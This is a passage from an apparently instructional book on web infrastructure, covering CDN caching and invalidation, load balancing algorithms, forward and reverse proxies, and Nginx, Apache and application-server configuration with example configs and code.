1. User requests `https://cdn.example.com/logo.png` (resolves via DNS to nearest PoP)
2. If the Tokyo PoP has `logo.png` cached: **Cache HIT** — serve immediately
3. If not cached: **Cache MISS** — Tokyo PoP fetches from origin, caches it, serves to user
4. All subsequent Tokyo users get a cache HIT

### CDN-Specific Headers

```http
# Tells the CDN how long to cache (overrides max-age for CDNs)
Cache-Control: public, s-maxage=86400

# Surrogate-Control (used by some CDNs like Fastly, Varnish)
Surrogate-Control: max-age=86400

# Surrogate-Key / Cache-Tag (for tag-based purging)
Surrogate-Key: product-42 category-shoes
Cache-Tag: product-42, homepage
```

**Tag-based purging** allows invalidating all cached responses tagged with `product-42` with a single API call — useful when a product's information changes.

### Types of Content on CDN

| Content Type | Cache Strategy |
|--------------|---------------|
| Static assets (JS, CSS, images) | `public, max-age=31536000, immutable` |
| HTML pages | `no-cache` or short TTL |
| API responses | Depends (often `private` or short TTL) |
| Video streams | Long TTL |
| Font files | Very long TTL |

### CDN Features Beyond Caching

Modern CDNs offer much more:
- **DDoS protection** — Absorb and filter massive attacks
- **SSL termination** — Handle HTTPS certificates at the edge
- **Edge computing** — Run code at the edge (Cloudflare Workers, AWS Lambda@Edge)
- **Image optimization** — Resize, convert, compress images on the fly
- **WAF (Web Application Firewall)** — Block malicious requests

### Popular CDNs
- **Cloudflare** — Most popular, free tier, extensive edge computing
- **AWS CloudFront** — Deep AWS integration
- **Fastly** — Popular with developers, instant purging
- **Akamai** — Enterprise, largest network
- **Bunny CDN** — Cost-effective

---

## 4.6 Cache Invalidation

"There are only two hard things in Computer Science: cache invalidation and naming things." — Phil Karlton

**Cache invalidation** is the process of removing or marking cached content as stale before its TTL expires.

### Methods

**1. URL-based invalidation (purge)**
Send a purge request to the CDN for a specific URL:
```bash
curl -X PURGE https://cdn.example.com/logo.png
```

**2. Tag-based invalidation**
Purge all resources with a specific cache tag:
```
DELETE https://api.cloudflare.com/cache/tags/product-42
```
Instantly invalidates all cached responses tagged `product-42` across all PoPs.

**3. Versioned URLs**
Don't invalidate — just change the URL:
```
Old: /app.js       → Cached forever
New: /app.v2.js    → Fresh fetch
```

**4. TTL-based (natural expiry)**
Simply wait for the `max-age` to expire. Simple but delayed.

**5. Stale-while-revalidate**
```http
Cache-Control: max-age=60, stale-while-revalidate=3600
```
Serve stale content immediately while fetching a fresh version in the background. Users never wait; the cache self-heals.

---

---

# Chapter 5: Load Balancers

## 5.1 The Problem of Scale

A single server can only handle so much traffic. As an application grows:
- CPU gets saturated
- Memory fills up
- Network bandwidth maxes out
- The single server becomes a **single point of failure**

**Load balancers** solve this by distributing incoming traffic across multiple servers, improving both **capacity** and **availability**.

---

## 5.2 What Is a Load Balancer?

A **load balancer** is a device or software that acts as the entry point for incoming requests and distributes them across a pool of backend servers (also called "upstream servers," "server pool," or "server farm").

```
                    ┌─────────────────┐
    Clients ──────▶ │  Load Balancer  │
                    └────────┬────────┘
                             │
               ┌─────────────┼─────────────┐
               ▼             ▼             ▼
         ┌──────────┐  ┌──────────┐  ┌──────────┐
         │ Server 1 │  │ Server 2 │  │ Server 3 │
         └──────────┘  └──────────┘  └──────────┘
```

From the client's perspective, the load balancer's IP is the address of the application. The backend servers are hidden.

---

## 5.3 Load Balancing Algorithms

How the load balancer decides which server to route a request to:

### Round Robin

Requests are distributed sequentially to each server in turn.

```
Request 1  → Server 1
Request 2  → Server 2
Request 3  → Server 3
Request 4  → Server 1 (back to start)
Request 5  → Server 2
...
```

**Best for:** Servers with identical hardware and handling roughly uniform requests.
**Problem:** Doesn't account for server load — a server handling a heavy long-running request gets the next request just as quickly.

### Weighted Round Robin

Servers with more capacity get proportionally more traffic.

```
Server 1 (weight: 3): Receives 3 requests
Server 2 (weight: 1): Receives 1 request
Server 3 (weight: 1): Receives 1 request
```

**Best for:** Heterogeneous server pools.

### Least Connections

New requests go to the server with the fewest active connections.

```
Server 1: 20 active connections
Server 2: 5 active connections  ← next request goes here
Server 3: 12 active connections
```

**Best for:** Varying request durations (e.g., some requests take 100ms, others take 5 seconds).

### Least Response Time

Routes to the server with both the fewest connections AND the fastest response time.

### IP Hash / Sticky Sessions

The client's IP address is hashed to determine which server handles all requests from that IP.

```
Client IP: 192.168.1.100 → hash() → Server 2 (always)
Client IP: 10.0.0.55     → hash() → Server 1 (always)
```

**Best for:** Applications where session state is stored on the server and not in a shared store. Ensures the same client always hits the same server (its session).

**Problem:** If Server 2 goes down, all clients mapped to Server 2 lose their sessions. Also creates uneven distribution if some IPs generate more traffic.

### Least Bandwidth

Routes to the server currently serving the least amount of traffic (in Mbps).

### Random

Selects a server randomly. Simple and surprisingly effective with many servers (statistically even distribution).

### Resource-Based

Routes based on server health metrics reported by health check agents — CPU usage, memory pressure, etc.

---

## 5.4 Layer 4 vs Layer 7 Load Balancing

Load balancers operate at different OSI model layers:

### Layer 4 (Transport Layer) Load Balancing

Operates on TCP/UDP packets. Routes based on IP address and port number only. Cannot see HTTP content.

```
L4 Load Balancer sees:
  Source IP: 203.0.113.5
  Dest IP:   192.168.1.1
  Port:      443 (HTTPS)
  → Routes to backend based on this info only
```

**Characteristics:**
- Very fast — minimal processing
- No SSL termination (packets are forwarded as-is)
- Cannot make routing decisions based on URL, headers, cookies
- Works with any TCP/UDP protocol

**Tools:** AWS NLB (Network Load Balancer), HAProxy (in TCP mode), F5 BIG-IP

### Layer 7 (Application Layer) Load Balancing

Operates on HTTP/HTTPS. Can inspect the full HTTP request — URL, headers, cookies, body.

```
L7 Load Balancer sees:
  GET /api/users HTTP/1.1
  Host: example.com
  Cookie: user_id=42
  → Can route based on URL path, headers, cookies
```

**Characteristics:**
- Rich routing capabilities
- SSL termination (decrypts HTTPS, inspects content, optionally re-encrypts to backend)
- Can route `/api/*` requests to API servers and `/static/*` to static file servers
- Can modify requests and responses (add headers, rewrite URLs)
- Slightly more overhead than L4

**Tools:** AWS ALB (Application Load Balancer), Nginx, HAProxy (in HTTP mode), Traefik

### L7 Routing Example (Nginx)

```nginx
upstream api_servers {
  server api1.internal:3000;
  server api2.internal:3000;
}

upstream web_servers {
  server web1.internal:8080;
  server web2.internal:8080;
}

server {
  listen 80;
  
  # Route API requests to API server pool
  location /api/ {
    proxy_pass http://api_servers;
  }
  
  # Route all other requests to web server pool
  location / {
    proxy_pass http://web_servers;
  }
}
```

---

## 5.5 Health Checks

A load balancer continuously monitors backend servers to detect failures:

### Passive Health Checks
Monitor real traffic — if a server returns 5xx errors or timeouts, mark it as unhealthy.

### Active Health Checks
The load balancer proactively sends probe requests to each backend:

```
Every 30 seconds:
  GET /health HTTP/1.1
  Host: server1.internal
  
  Expected: 200 OK
  If timeout or 5xx → mark server unhealthy → remove from rotation
```

**Health check endpoint example:**
```javascript
app.get('/health', (req, res) => {
  // Check database connection, dependencies, etc.
  const isHealthy = checkDatabase() && checkRedis();
  
  if (isHealthy) {
    res.status(200).json({ status: 'healthy', timestamp: Date.now() });
  } else {
    res.status(503).json({ status: 'unhealthy' });
  }
});
```

When a server fails health checks, the load balancer automatically removes it from rotation. When it recovers, it's added back. This enables **zero-downtime deployments** — take servers out of rotation one at a time to update them.

---

## 5.6 Session Persistence (Sticky Sessions)

When an application stores session state in the server's local memory (not in Redis or a database), a user must always be routed to the same server — otherwise their session data won't be found.

**Methods for sticky sessions:**

**1. Cookie-based persistence**
The load balancer inserts its own cookie:
```http
Set-Cookie: SERVERID=server2; Path=/
```

**2. IP-based persistence**
Client IP is used to determine server assignment (IP Hash algorithm).

**3. Application session persistence**
Application includes the server ID in its session cookie, load balancer reads it.

**Recommendation:** Design applications to use a **shared session store** (Redis) instead of relying on sticky sessions. This makes your system more resilient — any server can handle any request.

---

## 5.7 SSL Termination

HTTPS encryption/decryption is computationally expensive. **SSL termination** at the load balancer means:

1. The client connects to the load balancer via HTTPS
2. The load balancer decrypts the TLS traffic
3. The load balancer forwards the plain HTTP request to backend servers
4. Backend servers communicate over HTTP (within a trusted private network)

```
Client ──HTTPS──▶ Load Balancer ──HTTP──▶ Backend Servers
                  (SSL terminates here)   (Private network)
```

**Benefits:**
- Backend servers don't need SSL certificates
- Reduces CPU load on backend servers
- Load balancer can inspect and route based on HTTP content
- Centralized certificate management

**If end-to-end encryption is required:** SSL passthrough (L4) or SSL bridging (L7 re-encrypts to backend).

---

## 5.8 Types of Load Balancers

### Hardware Load Balancers
Physical appliances: F5 BIG-IP, Citrix ADC.
- Extremely high performance
- Very expensive ($10,000-$100,000+)
- Common in large enterprises and financial institutions

### Software Load Balancers
Programs running on commodity hardware: HAProxy, Nginx, Traefik.
- Cost-effective
- Flexible and configurable
- Easy to scale horizontally
- Industry standard for most web companies

### Cloud Load Balancers (Managed Services)
Provided by cloud providers: AWS ALB/NLB, GCP Load Balancer, Azure Load Balancer.
- No infrastructure management
- Auto-scaling
- Deep integration with cloud services
- Pay-per-use pricing

### DNS Load Balancing
Different IP addresses returned by DNS for the same domain.
```
example.com → 1.2.3.4 (Server 1)
example.com → 5.6.7.8 (Server 2)
example.com → 9.10.11.12 (Server 3)
```
DNS clients round-robin between them. Very simple but no health awareness.

---

## 5.9 High Availability for Load Balancers

A load balancer itself can be a single point of failure. Production setups use **redundant load balancers**:

```
                    ┌─────────────┐
     VIP ──────────▶│  LB Primary │
(Virtual IP)        └─────────────┘
     │ (Failover)         │ (Heartbeat)
     └──────────────▶┌─────────────┐
                      │  LB Standby │
                      └─────────────┘
```

Using protocols like **VRRP (Virtual Router Redundancy Protocol)** or **Keepalived**, the primary LB owns a Virtual IP. If the primary fails, the standby takes over the VIP within seconds.

AWS, GCP, and Azure handle this automatically for managed load balancers.

---

---

# Chapter 6: Reverse Proxies vs Forward Proxies

## 6.1 What Is a Proxy?

A **proxy** is an intermediary server that sits between a client and a destination server, forwarding requests on behalf of one of them. There are two fundamental types — forward proxies and reverse proxies — and they serve opposite purposes.

---

## 6.2 Forward Proxy

A **forward proxy** sits between **clients and the internet**, acting on behalf of **clients**.

```
Client ──▶ Forward Proxy ──▶ Internet ──▶ Server
```

The client explicitly configures the proxy (or the network forces all traffic through it). The client sends its request to the proxy, and the proxy makes the request to the destination server on the client's behalf.

**The server sees the proxy's IP, not the client's IP.** The client's identity is hidden from the server.

### Use Cases for Forward Proxies

**1. Anonymity/Privacy**
```
Client (IP: 192.168.1.5) → Proxy (IP: 1.2.3.4) → example.com
                                                   (sees 1.2.3.4, not 192.168.1.5)
```

**2. Content Filtering (Corporate/School Networks)**
The proxy inspects all outbound requests and blocks certain URLs:
```
Employee → Proxy → facebook.com → BLOCKED (policy violation)
Employee → Proxy → github.com   → ALLOWED
```

**3. Bypassing Geo-restrictions**
A user in one country routes traffic through a proxy in another country to access geo-blocked content.

**4. Caching Outbound Traffic**
Organizations cache frequently accessed content (software updates, web pages) at the proxy to save bandwidth.

**5. VPNs**
VPNs act as a type of forward proxy — all traffic is tunneled through the VPN server.

### Forward Proxy Configuration

Most operating systems and browsers allow proxy configuration:
```
HTTP_PROXY=http://proxy.example.com:8080
HTTPS_PROXY=http://proxy.example.com:8080
NO_PROXY=localhost,127.0.0.1
```

---

## 6.3 Reverse Proxy

A **reverse proxy** sits between **the internet and backend servers**, acting on behalf of **servers**.

```
Client ──▶ Internet ──▶ Reverse Proxy ──▶ Server
```

Clients think they're talking directly to the server. The reverse proxy receives requests and routes them to appropriate backend servers. The **client doesn't know** the backend servers exist — they're hidden behind the proxy.

**The client sees the reverse proxy's IP. The proxy's IP is the "server" from the client's perspective.**

### Use Cases for Reverse Proxies

**1. Load Balancing**
Distributes requests across multiple backend servers (this is the overlap between load balancers and reverse proxies):
```nginx
upstream backend {
  server 10.0.0.1:8080;
  server 10.0.0.2:8080;
  server 10.0.0.3:8080;
}

server {
  location / {
    proxy_pass http://backend;
  }
}
```

**2. SSL Termination**
Handle HTTPS externally, communicate with backends via HTTP:
```nginx
server {
  listen 443 ssl;
  ssl_certificate /etc/ssl/cert.pem;
  ssl_certificate_key /etc/ssl/key.pem;
  
  location / {
    proxy_pass http://backend:8080; # HTTP to backend
  }
}
```

**3. Caching**
Cache backend responses, serve from cache for repeated requests:
```nginx
proxy_cache_path /data/nginx/cache levels=1:2 keys_zone=my_cache:10m;

server {
  location / {
    proxy_cache my_cache;
    proxy_cache_valid 200 1h;
    proxy_pass http://backend;
  }
}
```

**4. Compression**
Compress responses before sending to clients:
```nginx
gzip on;
gzip_types text/html text/css application/javascript application/json;
gzip_min_length 1024;
```

**5. Security (WAF, Rate Limiting, IP Blocking)**
```nginx
# Rate limiting
limit_req_zone $binary_remote_addr zone=api:10m rate=100r/m;

server {
  location /api/ {
    limit_req zone=api burst=20;
    proxy_pass http://backend;
  }
}
```

**6. Request Routing**
Route different URL paths to different backend services (microservices):
```nginx
server {
  location /auth/ {
    proxy_pass http://auth-service:3001;
  }
  
  location /products/ {
    proxy_pass http://product-service:3002;
  }
  
  location /orders/ {
    proxy_pass http://order-service:3003;
  }
}
```

**7. Header Manipulation**
Add, remove, or modify headers:
```nginx
proxy_set_header Host            $host;
proxy_set_header X-Real-IP       $remote_addr;
proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
proxy_set_header X-Forwarded-Proto $scheme;
```

The `X-Forwarded-For` header is crucial — it carries the original client's IP so the backend can know who the real user is, even though the immediate connection comes from the reverse proxy.

**8. Serving Static Files**
Let Nginx serve static files directly without hitting the application server:
```nginx
location /static/ {
  root /var/www/myapp;
  expires 1y;
  add_header Cache-Control "public, immutable";
}

location / {
  proxy_pass http://app_server:5000;
}
```

---

## 6.4 Side-by-Side Comparison

| Aspect | Forward Proxy | Reverse Proxy |
|--------|---------------|---------------|
| Acts on behalf of | Clients | Servers |
| Client knows about it? | Usually yes (configured) | No (transparent) |
| Server sees | Proxy's IP | Proxy's IP |
| Primary purpose | Client privacy, filtering, caching | Server protection, load balancing, SSL |
| Examples | Squid, corporate proxy, VPN | Nginx, HAProxy, Cloudflare |
| Who configures it | Client/network admin | Server/infrastructure admin |

---

## 6.5 Real-World Architecture with Both

Large companies often use both:

```
Internet Users
      │
      ▼
[Forward Proxy / CDN / WAF]    ← Cloudflare (acts as reverse proxy)
      │
      ▼
[Reverse Proxy / Load Balancer] ← Nginx
      │
      ├── [App Server Pool]
      │
      └── [Static File Servers]
      
Company Employees
      │
      ▼
[Forward Proxy]                 ← Squid/Zscaler (content filtering)
      │
      ▼
[Internet]
```

---

## 6.6 Nginx as a Reverse Proxy — Complete Example

```nginx
# /etc/nginx/nginx.conf

worker_processes auto;

events {
  worker_connections 1024;
}

http {
  # Upstream server pool
  upstream app_servers {
    least_conn;                    # Least connections algorithm
    server 10.0.0.1:3000 weight=3;
    server 10.0.0.2:3000 weight=1;
    server 10.0.0.3:3000 backup;  # Only used if others fail
    
    keepalive 32;                  # Keep 32 persistent connections to backends
  }
  
  # Cache configuration
  proxy_cache_path /tmp/nginx_cache levels=1:2 
                   keys_zone=app_cache:10m max_size=1g;
  
  # Rate limiting zone
  limit_req_zone $binary_remote_addr zone=general:10m rate=60r/m;
  
  server {
    listen 80;
    server_name example.com;
    return 301 https://$server_name$request_uri;  # Redirect HTTP to HTTPS
  }
  
  server {
    listen 443 ssl http2;
    server_name example.com;
    
    # SSL configuration
    ssl_certificate     /etc/ssl/example.com.crt;
    ssl_certificate_key /etc/ssl/example.com.key;
    ssl_protocols       TLSv1.2 TLSv1.3;
    ssl_ciphers         ECDHE-RSA-AES256-GCM-SHA512:DHE-RSA-AES256-GCM-SHA512;
    
    # Security headers
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    add_header X-Frame-Options DENY;
    add_header X-Content-Type-Options nosniff;
    
    # Gzip compression
    gzip on;
    gzip_types text/plain text/css application/json application/javascript;
    
    # Serve static files directly
    location /static/ {
      root /var/www/example;
      expires 1y;
      add_header Cache-Control "public, immutable";
    }
    
    # Cache API responses
    location /api/public/ {
      proxy_cache app_cache;
      proxy_cache_valid 200 5m;
      proxy_cache_use_stale error timeout updating;
      proxy_pass http://app_servers;
    }
    
    # Rate-limited API
    location /api/ {
      limit_req zone=general burst=10 nodelay;
      
      proxy_pass http://app_servers;
      proxy_set_header Host               $host;
      proxy_set_header X-Real-IP          $remote_addr;
      proxy_set_header X-Forwarded-For    $proxy_add_x_forwarded_for;
      proxy_set_header X-Forwarded-Proto  $scheme;
      
      proxy_read_timeout  30s;
      proxy_send_timeout  30s;
    }
    
    # Main application
    location / {
      proxy_pass http://app_servers;
      proxy_set_header Host               $host;
      proxy_set_header X-Real-IP          $remote_addr;
      proxy_set_header X-Forwarded-For    $proxy_add_x_forwarded_for;
      proxy_set_header X-Forwarded-Proto  $scheme;
    }
  }
}
```

---

---

# Chapter 7: Web Servers vs Application Servers

## 7.1 Understanding the Distinction

The terms "web server" and "application server" are often used interchangeably, but they represent different conceptual roles — and different software — in the web infrastructure stack.

| Aspect | Web Server | Application Server |
|--------|------------|--------------------|
| **Primary job** | Serve static files, handle HTTP | Execute application code |
| **Knows about** | HTTP, file system | Business logic, databases, frameworks |
| **Languages** | N/A (serves files) | Python, Ruby, Java, Node.js, PHP |
| **State** | Stateless (serves files) | Can be stateful |
| **Examples** | Nginx, Apache | Gunicorn, Puma, Unicorn, Tomcat |

In practice, the line is blurry — many "web servers" can run code (Apache + PHP, Nginx + OpenResty/Lua), and many application servers also serve some static files. But architecturally, the separation has important benefits.

---

## 7.2 Web Servers

A **web server** is software that accepts HTTP/HTTPS requests and responds with files from a file system or forwards requests to backend processes. It excels at:

- Serving static files (HTML, CSS, JS, images, videos) very efficiently
- Handling SSL/TLS termination
- Acting as a reverse proxy
- Managing connections efficiently at high scale

### 7.2.1 Nginx

**Nginx** (pronounced "engine-x") was created by Igor Sysoev in 2004 to solve the "C10K problem" — handling 10,000 concurrent connections. It uses an **event-driven, asynchronous, non-blocking architecture**.

#### Nginx Architecture

```
Master Process
  │
  ├── Worker Process 1 (single thread, event loop)
  │     ├── Connection 1
  │     ├── Connection 2
  │     ├── ...
  │     └── Connection N
  │
  ├── Worker Process 2 (single thread, event loop)
  │
  └── Cache Manager Process
```

Each worker process handles thousands of connections using an event loop (similar to Node.js). No thread-per-connection — the non-blocking I/O model means a worker waits for I/O with `epoll` (Linux) or `kqueue` (BSD) instead of blocking.

**Implication:** Nginx uses very little memory per connection (compared to thread-based models) and handles massive concurrency.

#### Nginx Configuration Basics

Nginx is configured via a hierarchical configuration file with **blocks**:

```nginx
# Main context (global)
worker_processes 4;
error_log /var/log/nginx/error.log warn;
pid /var/run/nginx.pid;

# Events context
events {
  worker_connections 1024;
  use epoll;          # Linux I/O event mechanism
  multi_accept on;    # Accept multiple connections at once
}

# HTTP context
http {
  include mime.types;
  default_type application/octet-stream;
  
  # Logging
  log_format main '$remote_addr - $remote_user [$time_local] "$request" '
                  '$status $body_bytes_sent "$http_referer" '
                  '"$http_user_agent"';
  access_log /var/log/nginx/access.log main;
  
  # Performance
  sendfile on;           # Use OS-level sendfile() for efficiency
  tcp_nopush on;         # Batch TCP packets
  keepalive_timeout 65;
  
  # Virtual Host (Server context)
  server {
    listen 80;
    server_name example.com www.example.com;
    root /var/www/example;
    index index.html;
    
    # Location blocks (URL routing)
    location / {
      try_files $uri $uri/ =404;
    }
    
    location /images/ {
      expires 30d;
    }
    
    location ~ \.php$ {
      fastcgi_pass unix:/var/run/php/php8.1-fpm.sock;
      fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
      include fastcgi_params;
    }
  }
}
```

#### Nginx Location Block Matching

Nginx matches location blocks with specific rules:

```nginx
# Exact match (highest priority)
location = /robots.txt { ... }

# Prefix match, case-sensitive (highest priority prefix)
location ^~ /static/ { ... }

# Regex match, case-sensitive
location ~ \.css$ { ... }

# Regex match, case-insensitive
location ~* \.(jpg|jpeg|png|gif)$ { ... }

# Prefix match (lowest priority)
location /api/ { ... }

# Default (matches everything)
location / { ... }
```

**Priority order:** `=` → `^~` → `~` / `~*` → prefix → `/`

#### `try_files` Directive

```nginx
location / {
  try_files $uri $uri/ /index.html;
}
```

For a request to `/about`:
1. Try `/var/www/example/about` (as file)
2. Try `/var/www/example/about/` (as directory with index)
3. Fall back to `/index.html` (for SPA routing)

#### Nginx Performance Features

```nginx
# sendfile: kernel-space file transfer (avoids user-space copy)
sendfile on;

# tcp_nopush: send headers and file start in one packet
tcp_nopush on;

# tcp_nodelay: send data immediately (after tcp_nopush handoff)
tcp_nodelay on;

# Open file cache: avoid repeated file system lookups
open_file_cache max=1000 inactive=20s;
open_file_cache_valid 30s;
open_file_cache_min_uses 2;

# Worker processes == CPU cores
worker_processes auto;

# CPU affinity (pin each worker to a core)
worker_cpu_affinity auto;
```

---

### 7.2.2 Apache HTTP Server

**Apache** (the Apache HTTP Server Project) is the oldest and, for a long time, most widely deployed web server (created in 1995). It takes a different architectural approach than Nginx.

#### Apache's Processing Models (MPMs)

**Prefork MPM** (older, PHP compatible):
```
Parent Process
  ├── Worker Process (handles 1 request at a time)
  ├── Worker Process (handles 1 request at a time)
  └── Worker Process (handles 1 request at a time)
```
Each process handles one connection. Simple but memory-intensive.

**Worker MPM** (threaded):
```
Parent Process
  ├── Child Process
  │     ├── Thread 1
  │     ├── Thread 2
  │     └── Thread 3
  └── Child Process
        ├── Thread 1
        └── Thread 2
```
Threads share memory, more efficient than Prefork.

**Event MPM** (like Nginx's model):
Similar to Worker but uses an asynchronous model for keep-alive connections, freeing threads for active requests.

#### Apache Configuration (httpd.conf / .htaccess)

```apache
# Virtual Host
<VirtualHost *:80>
    ServerName example.com
    DocumentRoot /var/www/example
    
    <Directory /var/www/example>
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>
    
    # Alias for static files
    Alias /static/ /var/www/static/
    
    # Rewrite rules (RewriteModule)
    RewriteEngine On
    RewriteCond %{HTTPS} off
    RewriteRule ^ https://%{HTTP_HOST}%{REQUEST_URI} [R=301,L]
    
    # PHP configuration
    <FilesMatch \.php$>
        SetHandler application/x-httpd-php
    </FilesMatch>
    
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```

#### `.htaccess` Files

Apache's famous `.htaccess` files allow per-directory configuration — the directory owner can override server settings:

```apache
# /var/www/myapp/.htaccess

# URL rewriting (SPA routing)
Options -MultiViews
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-f
RewriteRule ^ index.html [QSA,L]

# Custom error pages
ErrorDocument 404 /errors/404.html

# Deny access to sensitive files
<Files ".env">
    Require all denied
</Files>

# Enable gzip
<IfModule mod_deflate.c>
    AddOutputFilterByType DEFLATE text/html text/css application/javascript
</IfModule>

# Cache control
<IfModule mod_expires.c>
    ExpiresActive On
    ExpiresByType image/jpeg "access plus 1 year"
    ExpiresByType text/css "access plus 1 month"
</IfModule>
```

**Note:** `.htaccess` is powerful but adds per-request file system overhead — Apache checks for `.htaccess` in every directory on every request. Nginx does not support `.htaccess` — all configuration is centralized, which is faster.

#### Apache's Module System

Apache's functionality is extended through modules:

```apache
# Load modules
LoadModule rewrite_module modules/mod_rewrite.so
LoadModule ssl_module modules/mod_ssl.so
LoadModule php8_module modules/libphp8.so
LoadModule deflate_module modules/mod_deflate.so
LoadModule headers_module modules/mod_headers.so
```

Common modules:
- `mod_rewrite` — URL rewriting
- `mod_ssl` — HTTPS support
- `mod_proxy` — Reverse proxy
- `mod_deflate` — Gzip compression
- `mod_cache` — Caching
- `mod_security` — WAF functionality

---

## 7.3 Application Servers

An **application server** runs your application code, handles business logic, queries databases, and generates dynamic responses. It speaks HTTP but is not optimized for serving static files.

Application servers are language-specific:

### Python: Gunicorn / uWSGI

**Gunicorn** (Green Unicorn) is the standard WSGI server for Python:

```
Gunicorn Architecture:

Master Process
  ├── Worker 1 (handles requests synchronously or async)
  ├── Worker 2
  └── Worker 3
```

**WSGI (Web Server Gateway Interface):** Standard interface between Python web frameworks and servers.

```bash
# Run Django app with Gunicorn
gunicorn myproject.wsgi:application \
  --workers 4 \
  --worker-class sync \
  --bind 0.0.0.0:8000 \
  --timeout 30 \
  --access-logfile /var/log/gunicorn/access.log \
  --error-logfile /var/log/gunicorn/error.log
```

```python
# myproject/wsgi.py
import os
from django.core.wsgi import get_wsgi_application

os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'myproject.settings')
application = get_wsgi_application()
```

**Worker types:**
- `sync` — Default, synchronous, one request per worker at a time
- `gevent` / `eventlet` — Asynchronous with green threads
- `gthread` — Threaded workers

**Rule of thumb for worker count:** `(2 × CPU cores) + 1`

**ASGI with Uvicorn** (for async frameworks like FastAPI, Django Channels):
```bash
uvicorn main:app --workers 4 --host 0.0.0.0 --port 8000
```

### Ruby: Puma / Unicorn / Passenger

**Puma** is the standard app server for Ruby on Rails:

```bash
# Puma configuration
puma -t 5:5 -w 3 -b tcp://0.0.0.0:3000
# -t min:max threads, -w workers
```

```ruby
# config/puma.rb
workers ENV.fetch("WEB_CONCURRENCY") { 2 }
threads_count = ENV.fetch("RAILS_MAX_THREADS") { 5 }
threads threads_count, threads_count

preload_app!

rackup DefaultRackup
port ENV.fetch("PORT") { 3000 }
environment ENV.fetch("RAILS_ENV") { "development" }
```

**Unicorn** uses a different model — forking workers, popular for its crash isolation:
```bash
unicorn_rails -c config/unicorn.rb
```

### Java: Tomcat / Jetty / WildFly

**Apache Tomcat** serves as a servlet container and application server for Java:

```xml
<!-- server.xml -->
<Connector port="8080" protocol="HTTP/1.1"
           connectionTimeout="20000"
           redirectPort="8443"
           maxThreads="200"
           minSpareThreads="10"
           acceptCount="100" />
```

Java application servers handle **thread-per-request** models (in traditional servlet containers) or reactive models (Netty, Spring WebFlux).

### Node.js

Node.js is unique — it acts as its own HTTP server:

```javascript
const express = require('express');
const app = express();

app.get('/api/users', async (req, res) => {
  const users = await db.query('SELECT * FROM users');
  res.json(users);
});

app.listen(3000, () => console.log('App running on port 3000'));
```

For production, Node.js is commonly run behind Nginx (for static files, SSL) and scaled with:
- **PM2** — Process manager, cluster mode
- **cluster module** — Fork workers per CPU core

```javascript
// cluster.js
const cluster = require('cluster');
const os = require('os');

if (cluster.isMaster) {
  const numWorkers = os.cpus().length;
  
  for (let i = 0; i < numWorkers; i++) {
    cluster.fork();
  }
  
  cluster.on('exit', (worker) => {
    console.log(`Worker ${worker.process.pid} died. Forking a new one.`);
    cluster.fork(); // Auto-restart
  });
} else {
  // Worker processes run the Express app
  require('./app.js');
}
```

### PHP: PHP-FPM

PHP-FPM (FastCGI Process Manager) manages a pool of PHP worker processes:

```ini
; /etc/php/8.1/fpm/pool.d/www.conf
[www]
user = www-data
group = www-data
listen = /var/run/php/php8.1-fpm.sock

pm = dynamic
pm.max_children = 50
pm.start_servers = 5
pm.min_spare_servers = 5
pm.max_spare_servers = 35
pm.max_requests = 500
```

Nginx communicates with PHP-FPM via FastCGI:

```nginx
location ~ \.php$ {
  fastcgi_pass unix:/var/run/php/php8.1-fpm.sock;
  fastcgi_index index.php;
  fastcgi_param SCRIPT_FILENAME $realpath_root$fastcgi_script_name;
  include fastcgi_params;
}
```

---

## 7.4 The Nginx + Gunicorn Architecture Pattern

The most common production deployment pattern for Python web apps:

```
                    ┌─────────────────────────────────────┐
Internet users      │           Nginx (Web Server)         │
     ──────────────▶│                                      │
     HTTPS          │  ┌─────────────────┐                 │
                    │  │ Serve /static/  │                 │
                    │  │ Serve /media/   │                 │
                    │  └─────────────────┘                 │
                    │                                      │
                    │  ┌─────────────────┐                 │
                    │  │ proxy_pass to   │                 │
                    │  │ Gunicorn (8000) │                 │
                    │  └────────┬────────┘                 │
                    └───────────┼─────────────────────────┘
                                │ Unix socket / TCP
                    ┌───────────▼─────────────────────────┐
                    │         Gunicorn (App Server)        │
                    │                                      │
                    │  Worker 1  │  Worker 2  │  Worker 3  │
                    │   Django   │   Django   │   Django   │
                    └───────────────────────┬─────────────┘
                                            │
                    ┌───────────────────────▼─────────────┐
                    │           PostgreSQL + Redis         │
                    └─────────────────────────────────────┘
```

**Nginx handles:**
- SSL termination
- Static file serving (faster than Python)
- Rate limiting
- Gzip compression
- Reverse proxying to Gunicorn

**Gunicorn handles:**
- Running Django/Flask application code
- Database queries (via ORM)
- Business logic execution
- Dynamic response generation

**Nginx configuration for this setup:**

```nginx
upstream django_app {
  server unix:/tmp/gunicorn.sock fail_timeout=0;
  # OR: server 127.0.0.1:8000 fail_timeout=0;
}

server {
  listen 80;
  server_name example.com;
  return 301 https://$server_name$request_uri;
}

server {
  listen 443 ssl;
  server_name example.com;
  
  ssl_certificate /etc/ssl/example.com.crt;
  ssl_certificate_key /etc/ssl/example.com.key;
  
  # Serve Django static files directly
  location /static/ {
    alias /var/www/myapp/staticfiles/;
    expires 30d;
  }
  
  # Serve uploaded media files directly
  location /media/ {
    alias /var/www/myapp/media/;
  }
  
  # Pass everything else to Gunicorn
  location / {
    proxy_set_header Host $http_host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
    
    proxy_connect_timeout 60s;
    proxy_read_timeout 60s;
    
    proxy_pass http://django_app;
  }
}
```

---

## 7.5 Nginx vs Apache — When to Use Which

| Aspect | Nginx | Apache |
|--------|-------|--------|
| Architecture | Event-driven, async | Process/thread-based |
| Concurrency | Excellent (thousands) | Good (hundreds-thousands) |
| Static file serving | Excellent | Very Good |
| Memory usage | Low | Higher |
| Configuration | Centralized only | Centralized + .htaccess |
| Dynamic content | Via FastCGI/proxy | Native (mod_php, etc.) |
| `.htaccess` | No | Yes |
| Modules | Static (compiled in) | Dynamic (runtime) |
| Community/docs | Excellent | Excellent (older, more docs) |
| PHP integration | Via PHP-FPM | Native mod_php or PHP-FPM |
